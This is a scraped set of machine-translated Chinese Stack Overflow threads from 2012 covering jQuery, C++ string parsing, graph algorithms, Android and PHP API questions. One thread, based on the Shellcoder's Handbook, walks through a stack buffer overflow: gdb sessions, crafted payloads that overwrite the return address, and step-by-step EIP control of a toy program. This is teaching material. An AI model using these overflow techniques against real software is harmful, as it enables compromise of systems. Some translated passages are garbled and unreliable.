> 时间：2012-08-13T16:53:11.763

先让 jQuery UI 修改 DOM，然后让 AngularJS 进行 DOM 操作。这样，Angular 将绑定到修改后的 DOM 元素。我将您的 JavaScript 放在页面底部以使其无需超时即可工作：

```
</body>
<script type="text/javascript">
    $(".test").buttonset()  // allow jQuery UI to manipulate the DOM here, first!
    function ExampleCtrl($scope) {
        $scope.list = [ ... ];
        $scope.calc = [ [...] ];
    }
</script> 
```

**更新**：正如@Chas.Owens 指出的那样，这不起作用。尽管数据绑定工作正常，但 UI 已损坏。如果 jQuery UI 首先修改 DOM（如上所示），AngularJS 数据绑定可以工作，但它会以某种方式破坏 UI。如果 AngularJS 先修改 DOM（最初的问题），AngularJS 数据绑定不起作用（可能是因为 buttonset 在标签文本周围添加了一个额外的 <span>），但 UI 可以工作。

# java - 找到具有一定权重的某个节点的循环路径

> ID：11935855
> 
> 赞同：0
> 
> 时间：2012-08-13T14:00:15.460
> 
> 标签：java, algorithm, graph-theory

我正在尝试构建一个导航应用程序。我试图想出一种算法来找到包含某个节点并总和为某个权重的循环路径。该算法的输入将是一个节点和一个权重。

示例：algo(a,30) - 该算法将返回一条可以从节点 A 开始并在节点 A 结束的路径，其总和为 30。

额外信息：对于所有 w:weights w>0，图形是有方向的（就像街道一样）。

提前谢谢加尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:15:44.887

[这个问题比哈密顿循环问题](http://en.wikipedia.org/wiki/Hamiltonian_path)更强（更难） 。因为如果我们已经有这个问题的解决方案`algo(a,b)`，对于任何哈密顿循环问题***P ，我们可以设计一个新图，其中******P***中的边权重 = 1，边不为 0，然后使用`algo(1,n)`找到一个哈密顿循环，其中`n`是图中的节点。所以我们这里有一个NP完全问题。

对于小的应用程序，`n`具有某些“修剪”的蛮力搜索应该足够快。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T14:16:15.020

一般问题是 NP-Hard ，并且可以从[最长路径问题](http://en.wikipedia.org/wiki/Longest_path_problem)中约简，因此是[NP-Hard](http://en.wikipedia.org/wiki/NP-hard)，并且没有已知的多项式解决方案可以解决这个问题（并且一般假设是不存在这样的解决方案）。

最长路径问题是：给定一个`G`具有权重函数`w`和一对顶点 的图`u`-找到从到`v`的最长路径。`u``v`

**证明：**
假设您的问题有一个多项式算法-可以使用二进制搜索构建最长路径问题的算法（以指数方式增加所需的权重，直到没有解决方案，然后-二进制搜索）。每个步骤都是多项式的，并且有`O(log|PATH|)`步骤。由于`log|PATH|`输入中是多项式（假设路径简单），因此该算法是多项式的。

它也与[哈密顿路径问题](http://en.wikipedia.org/wiki/Hamiltonian_path)和[旅行商问题密切相关](http://en.wikipedia.org/wiki/Travelling_salesman_problem)

# java - 我可以在 google drive api 上登录特定帐户吗？

> ID：11935859
> 
> 赞同：0
> 
> 时间：2012-08-13T14:00:35.147
> 
> 标签：java, android, google-drive-api

我有一个 Android 应用程序，我想做一个像墙一样的东西，每个人都可以在上面发帖。这不应该是一件非常有压力的事情，所以我想要一个免费的选项来让它 24/7 全天候运行，我想到了 gDocs。但我需要“卧底”使用它，这样人们就不会搞砸了。所以，我认为我必须使用管理员帐户登录并在没有用户干预的情况下操作所有创建和更新，只需显示我需要的字段。那么，我可以通过代码登录到特定的 gDocs 帐户，还是必须始终使用用户帐户？

我知道这不是最好的选择，但它是一个免费的应用程序，我不想为此付出任何代价。另外，我还没有开始开发，只是想知道是否可能。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:04:55.223

您可以使用您拥有用户名和密码的任何帐户登录 gDocs。
请记住，您必须将该帐户的密码存储在应用程序中（**不安全**）

我会向您推荐一个带有 mysql 的免费虚拟主机，并查询一个 html 请求到一个 php 文档，以便在您的墙上发布。在那里您可以使用 php 控制每个帖子。阅读帖子会浏览另一个 php 文档。由于您定义了格式，因此您可以拥有一个显示您的墙的网站，并且 android 会获得一个仅包含数据的 csv。

# c++ - 从 CString 中提取浮点数

> ID：11935864
> 
> 赞同：0
> 
> 时间：2012-08-13T14:00:59.983
> 
> 标签：c++, mfc, cstring

我想从格式化为的 CString 中提取浮点数：（例如提取 22.760348）

```
Incidence_angle(inc)[deg]                 :22.760348 
```

基本上我正在阅读一个包含一些参数的纯文本文件，并且我想对这些值执行一些计算。我使用 CStdioFile 对象读取文件并使用 readString 方法提取每一行，如下所示：

```
CStdioFile result(global::resultFile,CFile::modeRead);
while( result.ReadString(tmp) )
            {
                if(tmp.Find(L"Incidence_angle(inc)[deg]") != -1)
                {
                    //extract value of theeta i here
                    // this is probably wrong
                    theeta_i = _tscanf(L"Incidence_angle(inc)[deg]  :%f",&theeta_i);
                }
            } 
```

我尝试使用 scanf ，因为我想不出任何其他方式。

如果这个问题看起来非常基本和愚蠢，我深表歉意，但我已经坚持了很长时间，并且会得到一些帮助。

编辑：拿出我写的概念证明程序，造成混乱

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:07:22.300

`_tscanf()`返回所做的分配数，而不是读取的值：

```
theeta_i = _tscanf(L"Incidence_angle(inc)[deg]  :%f",&theeta_i); 
```

如果 a被成功读取，so`theeta_i`将包含`1`( )。改成：`.0``float`

```
if (1 == _tscanf(L"Incidence_angle(inc)[deg]  :%f",&theeta_i))
{
    /* One float value successfully read. */
} 
```

* * *

那应该是`_stscanf()`从缓冲区读取，`_tscanf()`将等待来自标准输入的输入。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T14:11:29.867

假设`tmp`是`CString`，正确的代码是

```
CStdioFile result(global::resultFile,CFile::modeRead);
while( result.ReadString(tmp) )
{
if (swscanf_s(tmp, L"Incidence_angle(inc)[deg]  :%f", &theeta_i) == 1)
    {
        // Use the float falue
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T14:12:28.237

为什么不使用[atof](http://www.cplusplus.com/reference/clibrary/cstdlib/atof/)？

来自链接的示例：

```
 /* atof example: sine calculator */
    #include <stdio.h>
    #include <stdlib.h>
    #include <math.h>

    int main ()
    {
      double n,m;
      double pi=3.1415926535;
      char szInput [256];
      printf ( "Enter degrees: " );
      gets ( szInput );
      n = atof ( szInput );
      m = sin (n*pi/180);
      printf ( "The sine of %f degrees is %f\n" , n, m );
      return 0;
    } 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-13T14:18:23.927

为什么不完全采用 C++ 方式呢？

这只是一个提示：

```
#include <iostream>
#include <string>
#include <sstream>

int main()
{
   double double_val=0.0;
   std::string dump("");
   std::string oneline("str 123.45 67.89 34.567"); //here I created a string containing floating point numbers
   std::istringstream iss(oneline);
   iss>>dump;//Discard the string stuff before the floating point numbers
   while ( iss >> double_val )
   {
      std::cout << "floating point number is = " << double_val << std::endl;
   }
   return 0;
} 
```

如果您想按照说明使用，仅使用 cstring，`strtod()`也请尝试。 *来源：* `man -s 3 strtod`

# jquery - jQuery - 为什么我的 jquery 隐藏/显示代码不起作用

> ID：11935865
> 
> 赞同：0
> 
> 时间：2012-08-13T14:01:00.070
> 
> 标签：jquery

我有这个非常简单的 jquery 代码，或者我是这么想的，但它的功能不像预期的那样

我想要的是，**如果从下拉列表中选择值 = '海报'，隐藏所有字段集，然后显示我选择的那些。如果从下拉列表中选择的值 = 'Logo'，则隐藏所有字段集，然后显示我选择的那些，依此类推**。我知道很简单，但字段集并不总是像它们应该隐藏的那样隐藏。

例如，如果我从下方选择“ **Logo ”，则只应显示****一个**字段集，这可行，然后如果我选择“ **booklet** ”，则应显示多个字段集并且这可行，但是如果我返回并再次选择徽标，所有字段集都保留下来，而不是全部隐藏，然后显示在项目类型“徽标”所需的字段集上。

谁能看到我做错了什么？ **注意**：更改项目类型下拉字段时，会调用 projectTypeChange()

```
function projectTypeChange()
{
        $(document).ready(function() {
        $('fieldset#section-960', 'fieldset#section-961', 'fieldset#section-962', 'fieldset#section-964', 'fieldset#section-967').hide();
        var dropVal = $('select#6211').val();

       if(dropVal ==  "Poster")
           {
              $('fieldset#section-960', 'fieldset#section-961', 'fieldset#section-962', 'fieldset#section-964', 'fieldset#section-967').hide();
              $('fieldset#section-960').show(); 
              $('fieldset#section-961').show(); 
              $('fieldset#section-967').show(); 
              $('fieldset#section-962').show(); 
           }
       if(dropVal ==  "Booklet")
           {
              $('fieldset#section-960', 'fieldset#section-961', 'fieldset#section-962', 'fieldset#section-964', 'fieldset#section-967').hide();
              $('fieldset#section-960').show(); 
              $('fieldset#section-961').show(); 
              $('fieldset#section-967').show(); 
              $('fieldset#section-962').show(); 
              $('fieldset#section-964').show(); 
           }
       if(dropVal ==  "Logo")
           {
              $('fieldset#section-960', 'fieldset#section-961', 'fieldset#section-962', 'fieldset#section-964', 'fieldset#section-967').hide();
              $('fieldset#section-962').show(); 
           }

        });
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:04:07.190

因为你用

`$(document).ready(function() { });`

这通常用于在文档加载后立即执行某些操作。一旦您的下拉框更改，您的文档已在不久前加载，并且其中的所有内容

```
$(document).ready(function() { 

    // this part here

 }); 
```

不会执行。

简单的解决方案：从事件处理程序中删除`$(document).ready(function() {`（及其右括号`});`，它首先不应该在那里。把它放在事件处理程序之外的某个地方。

您更正的代码应为：

```
$(document).ready(function() {
    $('fieldset#section-960', 'fieldset#section-961', 'fieldset#section-962', 'fieldset#section-964','fieldset#section-967').hide();
});

function projectTypeChange()
{
        var dropVal = $('select#6211').val();

       if(dropVal ==  "Poster")
           {
              $('fieldset#section-960', 'fieldset#section-961', 'fieldset#section-962', 'fieldset#section-964', 'fieldset#section-967').hide();
              $('fieldset#section-960').show(); 
              $('fieldset#section-961').show(); 
              $('fieldset#section-967').show(); 
              $('fieldset#section-962').show(); 
           }
       if(dropVal ==  "Booklet")
           {
              $('fieldset#section-960', 'fieldset#section-961', 'fieldset#section-962', 'fieldset#section-964', 'fieldset#section-967').hide();
              $('fieldset#section-960').show(); 
              $('fieldset#section-961').show(); 
              $('fieldset#section-967').show(); 
              $('fieldset#section-962').show(); 
              $('fieldset#section-964').show(); 
           }
       if(dropVal ==  "Logo")
           {
              $('fieldset#section-960', 'fieldset#section-961', 'fieldset#section-962', 'fieldset#section-964', 'fieldset#section-967').hide();
              $('fieldset#section-962').show(); 
           }

} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-13T14:13:44.430

好吧，现在就开枪打死我。我发现它 - 似乎总是发生，**之后**，我寻求帮助。

问题是我的报价。

**我有：** $('fieldset#section-960', 'fieldset#section-961', 'fieldset#section-962', 'fieldset#section-964', 'fieldset#section-967').hide();

**什么时候应该是：** $('fieldset#section-960, fieldset#section-961, fieldset#section-962, fieldset#section-964, fieldset#section-967').hide();

最后引用，而不是每个引号。我会留下这个，希望能防止其他人像我一样感到愚蠢。感谢您的输入。

# android - 谷歌政策是否允许共享应用程序？

> ID：11935870
> 
> 赞同：0
> 
> 时间：2012-08-13T14:01:16.707
> 
> 标签：android

谷歌政策是否允许我们在 android 设备中共享其他已安装的应用程序？

认为我们有一个应用程序管理器，我可以为用户制作一个工具来发送\共享应用程序吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:06:59.180

共享付费 APK 等同于盗版。

# java - 为 Android 开发 GIS 应用程序：Java 还是 Python？

> ID：11935879
> 
> 赞同：2
> 
> 时间：2012-08-13T14:01:57.150
> 
> 标签：java, android, python, gis

我是android应用程序开发的新手。我想知道两者中哪一个更容易开发更适合 GPS 和 GIS 相关数据/活动的 Android 应用程序。

我看到 python 主要用于 GIS 相关的应用程序/程序。我还听说/读到 Python 更容易编码和学习编码。此外，除了简单地记录加速度、GPS 数据以及触发相机活动之外，我不是在寻找复杂的应用程序。

根据您的回答，您会建议我使用什么 IDE？我正在使用 Eclipse IDE for Java 开发一些“Hello World Apps”。

[这篇](https://stackoverflow.com/questions/1640806/android-java-v-python)文章对我来说似乎很旧，答案似乎没有考虑 GIS 方面。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T14:14:12.003

我的建议是，除非你有一个经过同行评审的非常令人信服的理由，否则不要与 Android 平台抗衡。这意味着您应该只使用标准的 Java Android API。

我编写了几个使用 Android GPS 硬件的应用程序。您会发现许多使用 Java 的示例和指南。

如果您找到一些令人信服的理由将 python 用于企业系统的后端，那仍然是可能的。

As far as IDE advice, I prefer IntelliJ IDEA, having used both eclipse and IDEA. Eclipse is great, though I find the IDEA UI and features to be easier to learn and use. No doubt they are both fantastic and complicated software that will at times frustrate you.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T14:09:53.473

答案是 Java，因为 Java 是 Android 的语言。还有其他选项，例如带有 C# 的 Mono、Python、带有 NDK 的 C++、带有 Marmalade 的 C++ 等大多数官方 android 文档都是关于带有 NDK 的 java 和 C++。

Android 上的 Python 主要由 Python 爱好者在 root 环境中使用。如果您希望将其商业化并在 Google Play 市场上发布，那么您应该在此类应用程序中使用 Java。

# php - 限制 HTTP API 的公共访问

> ID：11935884
> 
> 赞同：0
> 
> 时间：2012-08-13T14:02:10.137
> 
> 标签：php, json, security, web-applications

我有一个 Web 应用程序，它由一个 JavaScript 前端和一个用 PHP 构建的后端组成，其中前端向后端的 URL 发出一些 AJAX 请求，例如：`api.examplesite.com?q=some_query`结果以 JSON 格式返回。

任何知道此 URL 的人都可以直接调用它并获得相同的结果。

使第三方无法访问此 URL 但仍适用于我的应用程序的最佳做法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T14:05:23.317

任何可用于 AJAX 调用的 URL 都可用于公共 Web。要保持它“私有”，您可以将其绑定到用户会话或令牌，您将在主页上启动它并在 AJAX 调用中持续存在。

此外，如果“some_query”是一个实际的 SQL 语句，那么这对于 AJAX 调用来说被认为是非常糟糕的做法。您的 SQL 应该只在服务器端直接可用，而不是任意客户端。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-13T14:08:39.767

实际上没有办法做到这一点。您的应用程序是客户端，因此它需要从服务器获取响应。这意味着它无论如何都可以被客户端拦截。

您可以使用加密来防止截获数据的人能够读取它。您可以在客户端应用程序中使用对称密码和硬编码某些密钥（这不好，因为如果密钥被泄露，则可以解密来自所有客户端的所有流量），或者您可以使用 SSL/TLS 与服务器（如果您传输敏感信息，我认为这是最好的解决方案）。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-25T18:33:45.687

客户端必须能够请求 URL 才能使用它。但是，您可以检查请求是否是使用 ajax 发出的，然后相应地返回信息：

```
if (isset($_SERVER['HTTP_X_REQUESTED_WITH'])
    AND strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
   // I'm AJAX!
} 
```

[查看此以获取更多信息](https://stackoverflow.com/questions/4301150/how-do-i-check-if-the-request-is-made-via-ajax-with-php)

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2012-08-13T14:08:35.137

为了安全起见，您可以在执行查询之前尝试强制使用数字类型或引用字符串。

例如

```
$number = (int) $number;
$string = htmlspecialchars($string); 
```

哦，对了，答案是：没有办法让它无法访问。

# c# - Asp.Net MVC 应用程序中的 CPU 使用率很高，而其他实用程序运行的进程更长

> ID：11935886
> 
> 赞同：0
> 
> 时间：2012-08-13T14:02:31.120
> 
> 标签：c#, asp.net, asp.net-mvc, console

我有一个使用 SQL 服务器数据库在 ASP .NET MVC 3 中开发的应用程序。

除此之外，我有一个控制台应用程序，它调用外部 Web 服务并使用信息和业务规则更新同一个数据库。（基本上我们从 Web 服务中迭代记录并处理业务规则并更新相同的数据库），我们已经使用 Windows 调度程序配置了控制台应用程序以定期处理它。

*问题是*，当我的控制台应用程序定期运行时，它使用了 100% 的 CPU 使用率（因为我们从 Web 服务中获得了 2000 多条记录），因此我当前的 MVC 应用程序正在运行或者有时工作非常缓慢因为这两个应用程序都配置在同一个 Windows 服务器上。

任何人都可以让我知道我将如何解决这个问题，因为我有两个应用程序都使用的中央数据库，我希望这两个东西都在同一台服务器上。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T14:31:58.307

您没有提供任何人可以真正提供解决方案的任何细节，所以我将简单地建议我将如何处理它。

首先，我会和 DBA 一起检查数据库模式，以确保没有表锁之类的东西（或者如果有，想出弥补它们的策略）。然后，我将使用 SQL Server 探查器查看在这些东西运行时 SQL Server 中哪里（或是否）有任何瓶颈。然后我会分析控制台应用程序以确保它没有做一些它不需要做的事情。我什至可能会考虑对网站进行概要分析，以查看其中是否有任何可能导致缓慢的内容。

在那之后，我会弄清楚如何摆脱控制台应用程序并将其功能应用到站点中。在给定的 Web 请求上生成另一个应用程序是不可扩展的。一次进来的不止几个，你有可能很容易让服务器陷入困境。

# c - 堆栈溢出（shellcoders 手册）

> ID：11935887
> 
> 赞同：1
> 
> 时间：2012-08-13T14:02:33.227
> 
> 标签：c, gdb, stack-overflow

我正在查看这个示例 wrt shellcoder's handbook(second edition)，并且对堆栈有一些疑问

```
root@bt:~/pentest# gdb -q sc  
Reading symbols from /root/pentest/sc...done.  
(gdb) set disassembly-flavor intel    
(gdb) list    
1   void ret_input(void){    
2       char array[30];  
3     
4       gets(array);  
5       printf("%s\n", array);  
6   }  
7   main(){  
8       ret_input();  
9     
10      return 0;  
(gdb) disas ret_input   
Dump of assembler code for function ret_input:  
   0x08048414 <+0>: push   ebp  
   0x08048415 <+1>: mov    ebp,esp  
   0x08048417 <+3>: sub    esp,0x24  
   0x0804841a <+6>: lea    eax,[ebp-0x1e]  
   0x0804841d <+9>: mov    DWORD PTR [esp],eax  
   0x08048420 <+12>:    call   0x804832c <gets@plt>  
   0x08048425 <+17>:    lea    eax,[ebp-0x1e]  
   0x08048428 <+20>:    mov    DWORD PTR [esp],eax  
   0x0804842b <+23>:    call   0x804834c <puts@plt>  
   0x08048430 <+28>:    leave    
   0x08048431 <+29>:    ret      
End of assembler dump.  
(gdb) break *0x08048420  
Breakpoint 1 at 0x8048420: file sc.c, line 4\.  
(gdb) break *0x08048431  
Breakpoint 2 at 0x8048431: file sc.c, line 6\.  
(gdb) run  
Starting program: /root/pentest/sc   

Breakpoint 1, 0x08048420 in ret_input () at sc.c:4  
4       gets(array);  
(gdb) x/20x $esp  
0xbffff51c: 0xbffff522  0xb7fca324  0xb7fc9ff4  0x08048460  
0xbffff52c: 0xbffff548  0xb7ea34a5  0xb7ff1030  0x0804846b  
0xbffff53c: 0xb7fc9ff4  0xbffff548  0x0804843a  0xbffff5c8  
0xbffff54c: 0xb7e8abd6  0x00000001  0xbffff5f4  0xbffff5fc  
0xbffff55c: 0xb7fe1858  0xbffff5b0  0xffffffff  0xb7ffeff4  
(gdb) continue   
Continuing.  
AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDD  
AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDD  

Breakpoint 2, 0x08048431 in ret_input () at sc.c:6  
6   }  
(gdb) x/20x 0x0bffff51c  
0xbffff51c: 0xbffff522  0x4141a324  0x41414141  0x41414141  
0xbffff52c: 0x42424242  0x42424242  0x43434242  0x43434343  
0xbffff53c: 0x43434343  0x44444444  0x44444444  0xbffff500  
0xbffff54c: 0xb7e8abd6  0x00000001  0xbffff5f4  0xbffff5fc  
0xbffff55c: 0xb7fe1858  0xbffff5b0  0xffffffff  0xb7ffeff4  
(gdb) ^Z  
[1]+  Stopped                 gdb -q sc  
root@bt:~/pentest# printf "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDD\x35\x84\x04\x08" | ./sc   
AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDD5�  
AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDD:�  
root@bt:~/pentest# 
```

在这个例子中，我使用了 48 个字节 "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDD\x35\x84\x04\x08" 来重写 ret 地址，一切正常。但是当我尝试使用本书第一版中的示例时，我遇到了一些问题

```
root@bt:~/pentest# gdb -q sc  
Reading symbols from /root/pentest/sc...done.  
(gdb) disas ret_input   
Dump of assembler code for function ret_input:  
   0x08048414 <+0>: push   %ebp  
   0x08048415 <+1>: mov    %esp,%ebp  
   0x08048417 <+3>: sub    $0x24,%esp  
   0x0804841a <+6>: lea    -0x1e(%ebp),%eax  
   0x0804841d <+9>: mov    %eax,(%esp)  
   0x08048420 <+12>:    call   0x804832c <gets@plt>  
   0x08048425 <+17>:    lea    -0x1e(%ebp),%eax  
   0x08048428 <+20>:    mov    %eax,(%esp)   
   0x0804842b <+23>:    call   0x804834c <puts@plt>  
   0x08048430 <+28>:    leave    
   0x08048431 <+29>:    ret      
End of assembler dump.  
(gdb) 
```

为什么程序占用了 24（十六进制）=36（十进制）字节作为数组，但我使用了 48 个重写，36 个字节的数组，8 个字节的 esp 和 ebp（我怎么知道），但是有钢有 4 个无法解释的字节

好的，让我们试试第一版书中的拆分，他们通过调用函数的地址重写了所有数组，在书中他们有“sub &0x20,%esp”所以代码是

```
main(){  
 int i=0;  
 char stuffing[44];  

 for (i=0;i<=40;i+=4) 
 *(long *) &stuffing[i] = 0x080484bb;  
 puts(array); 
```

我有 ""sub &0x24,%esp" 所以我的代码是

```
main(){  
 int i=0;  
 char stuffing[48];  

 for (i=0;i<=44;i+=4)
 *(long *) &stuffing[i] = 0x08048435;  
 puts(array); 
```

shellcoders 手册的结果

```
 [root@localhost /]# (./adress_to_char;cat) | ./overflow  
input   
""""""""""""""""""a<u___.input  
input  
input 
```

和我的结果

```
root@bt:~/pentest# (./ad_to_ch;cat) | ./sc  
5�h���ل$���������h����4��0��˄  
inout  
Segmentation fault  
root@bt:~/pentest# 
```

什么问题？我正在编译

> -fno-stack-protector -mpreferred-stack-boundary=2

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T11:11:13.943

我建议您最好通过在 GDB 中尝试来获得溢出缓冲区所需的字节数。我编译了您在问题中提供的源代码并通过 GDB 运行它：

```
gdb$ r < <(python -c "print('A'*30)")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[Inferior 1 (process 29912) exited normally] 
```

（请注意，我使用 Python 创建输入而不是编译的 C 程序。没关系，使用你喜欢的。）

所以 30 个字节就可以了。让我们再尝试一些：

```
gdb$ r < <(python -c "print('A'*50)")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
Cannot access memory at address 0x41414141
0x41414141 in ?? ()

gdb$ i r $eip
eip            0x41414141   0x41414141 
```

我们的`eip`寄存器现在包含`0x41414141`ASCII`AAAA`格式。现在，我们可以逐步检查我们必须将值放在更新缓冲区中的确切位置`eip`：

```
gdb$ r < <(python -c "print('A'*40+'BBBB')")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
Cannot access memory at address 0x8004242
0x08004242 in ?? () 
```

`B`是`0x42`。`eip`因此，我们在使用 40`A`和 4时覆盖了一半`B`。因此，我们用 42 填充，`A`然后输入我们想要更新的值`eip`：

```
gdb$ r < <(python -c "print('A'*42+'BBBB')")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
Cannot access memory at address 0x42424242
0x42424242 in ?? () 
```

我们完全控制了`eip`！让我们试试看。在末尾设置断点`ret_input`（您的地址可能会随着我重新编译二进制文件而有所不同）：

```
gdb$ dis ret_input
Dump of assembler code for function ret_input:
   0x08048404 <+0>: push   %ebp
   0x08048405 <+1>: mov    %esp,%ebp
   0x08048407 <+3>: sub    $0x38,%esp
   0x0804840a <+6>: lea    -0x26(%ebp),%eax
   0x0804840d <+9>: mov    %eax,(%esp)
   0x08048410 <+12>:    call   0x8048310 <gets@plt>
   0x08048415 <+17>:    lea    -0x26(%ebp),%eax
   0x08048418 <+20>:    mov    %eax,(%esp)
   0x0804841b <+23>:    call   0x8048320 <puts@plt>
   0x08048420 <+28>:    leave  
   0x08048421 <+29>:    ret    
End of assembler dump.
gdb$ break *0x8048421
Breakpoint 1 at 0x8048421 
```

举个例子，让我们修改`eip`一下，一旦从函数返回，`ret_input`我们就会再次回到函数的开头：

```
gdb$ r < <(python -c "print('A'*42+'\x04\x84\x04\x08')")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�    

--------------------------------------------------------------------------[code]
=> 0x8048421 <ret_input+29>:    ret    
   0x8048422 <main>:    push   ebp
   0x8048423 <main+1>:  mov    ebp,esp
   0x8048425 <main+3>:  and    esp,0xfffffff0
   0x8048428 <main+6>:  call   0x8048404 <ret_input>
   0x804842d <main+11>: mov    eax,0x0
   0x8048432 <main+16>: leave  
   0x8048433 <main+17>: ret    
--------------------------------------------------------------------------------

Breakpoint 1, 0x08048421 in ret_input () 
```

我们填充 42 `A`，然后将地址附加`ret_input`到我们的缓冲区。`ret`我们在触发器 上的断点。

```
gdb$ x/w $esp
0xffffd30c: 0x08048404 
```

在堆栈的顶部有我们缓冲区的最后一个 DWORD -`ret_input`的地址。

```
gdb$ n
0x08048404 in ret_input ()    

gdb$ i r $eip
eip            0x8048404    0x8048404 <ret_input> 
```

执行下一条指令会将该值从堆栈中弹出并`eip`相应地设置。

[附带说明：我推荐这个人](http://reverse.put.as)的 .gdbinit 文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T15:35:10.740

这一行：

对于 (i=o;i<=44;i+=4);

`;`从末端删除。我还假设在`o`这里输入错误的是（字母 o）而不是 0（零）。

问题是你的 for 循环正在执行`;`（也就是什么都不做），直到 i 变得大于 44，**然后**你执行下一个命令，`i = 44`它在数组的边界之外，你得到`Segmentation Error`. 您应该注意这种类型的错误，因为它几乎不可见，而且它是完全有效的 c 代码。

# jquery - 从 jQuery Mobile 控制组中删除项目

> ID：11935890
> 
> 赞同：1
> 
> 时间：2012-08-13T14:02:42.863
> 
> 标签：jquery, jquery-mobile

我有一个控制组，里面有一些按钮。现在我想在运行时删除一个按钮。

```
<div id="buttons" data-role="controlgroup" data-type="horizontal">
    <button id="btn1">Do 1</button>
    <button id="btn2">Do 2</button>
    <button id="btn3">Do 3</button>
</div> 

$('#btn1').remove(); 
```

但这不起作用。我可以使用它来隐藏它，`$('#btn1').button('disable');`但这不是我想要的。

没有错误。在水下，按钮实际上已被移除，但包裹的 span 和 div 仍然存在......

这是创建的实际 html：

```
<div data-type="horizontal" data-role="controlgroup" id="buttons" class="ui-corner-all ui-controlgroup ui-controlgroup-horizontal">
    <div class="ui-controlgroup-controls">
        <div data-corners="true" data-shadow="true" data-iconshadow="true" data-wrapperels="span" data-icon="" data-iconpos="" data-theme="c" data-inline="false" data-mini="false" class="ui-btn ui-btn-up-c ui-fullsize ui-btn-block ui-corner-left" aria-disabled="false">
            <span class="ui-btn-inner ui-corner-left">
                <span class="ui-btn-text">Do 1</span>
            </span>
            <!-- here button is gone, but not remaining div/span litter -->
        </div>
        <div data-corners="true" data-shadow="true" data-iconshadow="true" data-wrapperels="span" data-icon="" data-iconpos="" data-theme="c" data-inline="false" data-mini="false" class="ui-btn ui-btn-up-c ui-fullsize ui-btn-block" aria-disabled="false">
            <span class="ui-btn-inner">
                <span class="ui-btn-text">Do 2</span>
            </span>
            <button id="btn2" class="ui-btn-hidden" aria-disabled="false">Do 2</button>
        </div>
        <div data-corners="true" data-shadow="true" data-iconshadow="true" data-wrapperels="span" data-icon="" data-iconpos="" data-theme="c" data-inline="false" data-mini="false" class="ui-btn ui-btn-up-c ui-fullsize ui-btn-block ui-corner-right ui-controlgroup-last" aria-disabled="false">
            <span class="ui-btn-inner ui-corner-right ui-controlgroup-last">
                <span class="ui-btn-text">Do 3</span>
            </span>
            <button id="btn3" class="ui-btn-hidden" aria-disabled="false">Do 3</button>
        </div>
    </div>
</div> 
```

有人知道怎么做吗？ [http://jsfiddle.net/NVbjr/1/](http://jsfiddle.net/NVbjr/1/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T14:20:15.957

[http://jsfiddle.net/rlemon/NVbjr/2/](http://jsfiddle.net/rlemon/NVbjr/2/)

因为你没有以正确的顺序触发它。当它不应该出现时，你有小提琴'onload'。iirc jQuery mobile 的加载顺序很有趣。我将其移至 nowrap （正文），一切正常。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T14:40:09.340

您可以在事件处理程序“pagebeforecreate”中删除该元素。

```
$(document).bind('pagebeforecreate', function(){
    $('#btn1').remove();
}); 
```

否则，如果您想在以后的事件中删除它。你可以用其他方式做。

```
 $(document).bind('pageshow', function(){ 
     $('div[data-role=controlgroup]').children().each(function(index, value){
        if(index === 0) {
           $(value).remove();
        }
     });
 }); 
```

[https://dl.dropbox.com/u/49735179/Stackoverflow/buttonGroup/test.html](https://dl.dropbox.com/u/49735179/Stackoverflow/buttonGroup/test.html)

# java - 使用属性和局部变量的良好做法

> ID：11935891
> 
> 赞同：1
> 
> 时间：2012-08-13T14:02:46.777
> 
> 标签：java

将属性用作局部变量是一种好习惯吗？在有许多方法使用某些变量的情况下，在每种方法中，变量值都会发生变化。这避免了多次创建新变量和代码增加。有什么建议吗？

```
private void method1(){
     int totalLength = length1 + 10;
     int totalBreath = (breath1 + breath2) + 20;
     int size =  (totalLength * totalLength);
     System.out.println(size);
}

private void method2(){
     int totalLength = length1 + 20;
     int totalBreath = (breath1 + breath2) + 30;
     int size =  (totalLength * totalLength);
     System.out.println(size);
}

private void method3(){
     int totalLength = length1 + 60;
     int totalBreath = (breath1 + breath2) + 10;
     int size =  (totalLength * totalLength);
     System.out.println(size);
} 
```

